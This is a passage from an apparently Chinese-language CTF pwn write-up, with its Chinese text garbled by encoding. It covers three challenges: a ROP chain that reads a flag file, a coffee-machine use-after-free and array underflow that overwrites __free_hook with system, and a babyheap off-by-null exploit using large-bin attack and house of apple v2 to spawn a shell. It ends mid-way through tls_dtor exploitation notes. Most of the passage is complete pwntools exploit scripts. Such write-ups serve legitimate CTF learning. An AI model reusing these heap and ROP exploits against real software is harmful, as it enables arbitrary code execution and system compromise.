class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = flat([</span><br><span class="line">    stdout+<span class="number">0x3d</span>,                        <span class="comment"># rbp</span></span><br><span class="line">    csu_end, <span class="number">0x100000000</span>+<span class="number">0x7fc4d7d1b537</span>-<span class="number">0x00007fc4d7fec760</span>, stdout+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    magic,                                                      <span class="comment"># å°†stdout æ”¹æˆsyscall</span></span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x1</span>,                <span class="comment"># å‡½æ•°è¿”å›å€¼ä¸ºrax</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, stdout, <span class="number">1</span>, read_got, <span class="number">8</span>,                 <span class="comment"># syscall (1, 1, read_got, 8)ã€‚</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x100</span>,         <span class="comment"># è¯»å…¥ç¬¬äºŒä¸ªROPchian</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret                                                   <span class="comment"># è¿ç§»åˆ°ç¬¬äºŒä¸ªbss_chain</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">s(p2)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - libc.sym.read</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;bss&quot;</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = bss+<span class="number">0x1000</span></span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx; ret&quot;</span>)).__next__() </span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi; ret&quot;</span>)).__next__() </span><br><span class="line"></span><br><span class="line">rop_chian = flat([</span><br><span class="line">    <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>,  <span class="comment"># å¡«å……8å­—èŠ‚</span></span><br><span class="line">    pop_rdi_ret, flag_addr, pop_rsi_ret, <span class="number">0</span>, open_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, read_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, write_addr,</span><br><span class="line">    </span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">s(rop_chian)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


<h2 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h2><p>coffee_list: å­˜å‚¨å’–å•¡ä¿¡æ¯ã€‚<br>ä¸¤ä¸ªcoffee_leftæ•°ç»„ï¼Œåˆ†åˆ«æ˜¯ user å’Œ adminï¼Œæ˜¯ä¸€ä¸ª <code>3*7</code> æ•°ç»„ï¼Œidå’Œposition</p>
<p>user</p>
<ul>
<li>è´­ä¹°ï¼Œè¾“å…¥idï¼ŒæŒ‰ç…§posé¡ºåºè¿›è¡Œfree</li>
<li>æŸ¥çœ‹ï¼Œæ‰“å°å‡º coffee_list ä¿¡æ¯</li>
</ul>
<p>admin</p>
<ul>
<li>replenishï¼šå…ˆæ›´æ–°admin coffee_listï¼Œç„¶åæ›´æ–° user coffee_left</li>
<li>change_defaultï¼Œè¾“å…¥idå’Œposæ›´æ–°å†…å®¹ï¼Œç„¶åæ›´æ–°user coffee_left</li>
</ul>
<p>å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼Œéƒ½å¯ä»¥è¿›è¡Œæ³„éœ²å’Œ get shell</p>
<ul>
<li>adminåœ¨ change_default ä½¿ï¼Œæ²¡æœ‰å…ˆè¿›è¡Œupdateï¼Œç›´æ¥readä¼šå¯¼è‡´uafé—®é¢˜</li>
<li>æ•°ç»„underflowï¼Œå› ä¸ºè¯»å…¥çš„id, pos æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å°äº0ã€‚</li>
</ul>
<p>expå¦‚ä¸‹</p>
<ul>
<li>ç”±äºchange_defaultå­˜åœ¨æ›´æ–°ï¼Œå®¹æ˜“å¯¼è‡´double free å’Œ æ— æ³•  replenish çš„é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦ä¸­é€”æ›´æ–°ä¸€ä¸‹admin coffee_leftã€‚ï¼ˆ<del>èœé¸¡çš„çœ¼æ³ª</del></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;pwn_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">idx, con = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input the id of what coffee you want to buy&quot;</span>, itob(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Do you want to add something?Y/N&quot;</span>, <span class="string">b&quot;Y&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Ok,please input what you need in coffee&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    menu(<span class="number">0x1145</span>)</span><br><span class="line">    sa(<span class="string">b&quot;please input the admin password&quot;</span>, <span class="string">b&quot;just pwn it&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_admin</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replenish</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to replenish&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_default</span>(<span class="params"><span class="built_in">id</span>, pos, con</span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to change&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    sa(<span class="string">b&quot;input which coffee you want to change&quot;</span>, itob(pos))</span><br><span class="line">    sa(<span class="string">b&quot;input your content&quot;</span>, con)</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line">free_got = elf.got.free</span><br><span class="line">cofflist = <span class="number">0x4062F0</span></span><br><span class="line">stderr = <span class="number">0x4062e0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">4</span>, p64(cofflist))</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">2</span>, p64(stderr))</span><br><span class="line">show()</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1ed5c0</span></span><br><span class="line">lg(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">4</span>, p64(libc.sym.__free_hook))</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">2</span>, p64(libc.sym.system))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>å‡ºé¢˜äººå¾ˆå¥½å¿ƒçš„ç»™å‡ºäº†ä¸€ä¸ªå †åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨å †åˆå¹¶æ—¶ï¼Œç»•è¿‡unlink_chunkçš„assert</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>é—®é¢˜å‡ºç°åœ¨ è¯»å–æ•°æ®ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºå†™0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">read_con</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬sizeçš„é™åˆ¶ï¼Œè¿™ä¸ªå¤§å°çš„binä¸º tcache, unsorted, large bin</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">size &gt; <span class="number">0x3FF</span> &amp;&amp; size &lt;= <span class="number">0x500</span></span><br></pre></td></tr></table></figure>

<p>æ³„éœ²å‡ºåœ°å€ï¼Œ<code>large bin attack</code>ï¼Œä½¿ç”¨house of apple æ‰‹æ®µã€‚</p>
<ul>
<li>a-b-cï¼Œåœ¨aä¼ªé€ ä¸€ä¸ªå †ï¼Œä½†æ˜¯å› ä¸ºä½¿ç”¨putså‡½æ•°è¿›è¡Œshowï¼Œä½†æ˜¯ä¼šå­˜åœ¨<code>\x00</code> æˆªæ–­é—®é¢˜ï¼Œå¯ä»¥å°†aä¼ªé€ æˆä¸€ä¸ª free_chunkï¼Œå¹¶ä¸”ä¼šå› ä¸ºarenaåœ°å€æ— æ³•leakæˆåŠŸã€‚å› æ­¤éœ€è¦å †é£æ°´ä¸€ä¸‹ï¼Œè®©large bin arenaæœ€åä¸€å­—èŠ‚ä¸ä¸º0ã€‚</li>
<li>free b, a-b åˆå¹¶ï¼Œmalloc d, a &amp; dæŒ‡å‘åŒä¸€ä¸ªchunkï¼Œå°±å¯ä»¥æœ‰ç±»ä¼¼uafçš„æ•ˆæœã€‚</li>
<li>large bin attack çš„æ‰‹æ®µï¼š free a, aæ”¾å…¥largebin é‡Œï¼Œåˆ©ç”¨dä¿®æ”¹açš„ <code>bk_nextsize</code> ä¸º  <code>io_list_all-0x20</code> ï¼Œé‡Šæ”¾ä¸€ä¸ªæ¯”<code>a</code> sizeå°çš„chunk <code>e</code>ï¼Œå°†<code>e</code>æ”¾å…¥large biné‡Œã€‚è¿™æ · <code>io_list_all =&gt; heap a</code></li>
<li>house_of_appleï¼šåˆ©ç”¨dä¿®æ”¹aå†…å®¹ï¼Œä¼ªé€ ä¸€ä¸ª<code>fake_io</code></li>
<li>é€€å‡ºï¼ŒIOæµï¼Œå¹¶ä¸”æ­¤é¢˜æ²¡æœ‰æ²™ç®±</li>
</ul>
<p>house of apple çš„expå¦‚ä¸‹</p>
<ul>
<li>ä½†æ˜¯è¿™æ˜¯åœ¨æˆ‘kaliçš„glibc 2.37 ä¸‹è¿›è¡Œçš„ï¼Œåœ¨libc2.38 patchåä¼šå› ä¸ºarenaæœ€åä¸€ä¸ªå­—èŠ‚ä¸º0è€Œæ— æ³•æˆåŠŸï¼ŒğŸ˜«ï¼Œä¸æƒ³é£æ°´äº†</li>
<li>æœ€åå‡‘ä¸€ä¸ª <code>rdi/flag</code> ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>): <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;babyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, con</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, sz, con</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_addr - <span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x410</span>: <span class="number">0x420</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x418</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1d3ce0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x420</span>: <span class="number">0x430</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x428</span>, payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x18</span>: libc.sym._IO_list_all - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # house of apple v2</span></span><br><span class="line">fs = FileStructure()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line"><span class="comment"># write_base &lt; write_ptr</span></span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line"><span class="comment"># fs._lock = libc.sym._IO_stdfile_2_lock</span></span><br><span class="line"><span class="comment"># lock æ£€æŸ¥</span></span><br><span class="line">fs._lock = libc.address + <span class="number">0x1d5a20</span></span><br><span class="line"><span class="comment"># # codecvt = ?</span></span><br><span class="line"><span class="comment"># fs._codecvt = ?</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xff0</span> + <span class="number">0x500</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">wdata = fit(&#123;</span><br><span class="line">    <span class="number">0xe0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(wdata) + <span class="number">1</span>, wdata + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x4f0</span> + <span class="string">b&quot;     sh;&quot;</span>  <span class="comment"># flag rdi</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


<p>ä¸»è¦åˆ©ç”¨large bin leakï¼Œä½†æ˜¯å› ä¸ºå…¶å¯ä»¥ä½¿ç”¨tcache binï¼Œçœ‹åˆ°äº†å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µ</p>
<ul>
<li>æœ€ç»ˆtcacheä¿®æ”¹TLSï¼Œé€šè¿‡__call_tls_dtorså‡½æ•°å®ç°system(â€œ&#x2F;bin&#x2F;shâ€)</li>
<li>IO leak æ ˆåœ°å€ï¼Œç„¶åè·³è½¬åˆ°æ ˆä¸Šè¿›è¡ŒæŒ‡å‘å‡½æ•°ã€‚</li>
</ul>
<h3 id="tls-dtor"><a href="#tls-dtor" class="headerlink" title="tls_dtor"></a>tls_dtor</h3><p>ä¸€ç§æ¯”è¾ƒç®€å•çš„åˆ©ç”¨æ‰‹æ®µï¼Œæ­£å¸¸æƒ…å†µä¸‹å­˜åœ¨å¦‚ä¸‹çš„è°ƒç”¨é“¾</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	__run_exit_handlers</span><br><span class="line">		__call_tls_dtors</span><br></pre></td></tr></table></figure>

<p>å…¶å‡½æ•°å®ç°å¦‚ä¸‹</p>
<ul>
<li>ä¸€ä¸ªå…¨å±€å˜é‡æ˜¯å¦å­˜åœ¨</li>
<li>æ‰¾åˆ°å…¶å‡½æ•°æŒ‡é’ˆ</li>
<li><code>PTR_DEMANGLE</code> è®¡ç®—å‡½æ•°åœ°å€</li>
<li>è°ƒç”¨å‡½æ•°</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *cur = tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line">      <span class="built_in">PTR_DEMANGLE</span> (func);</span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      <span class="built_in">func</span> (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY 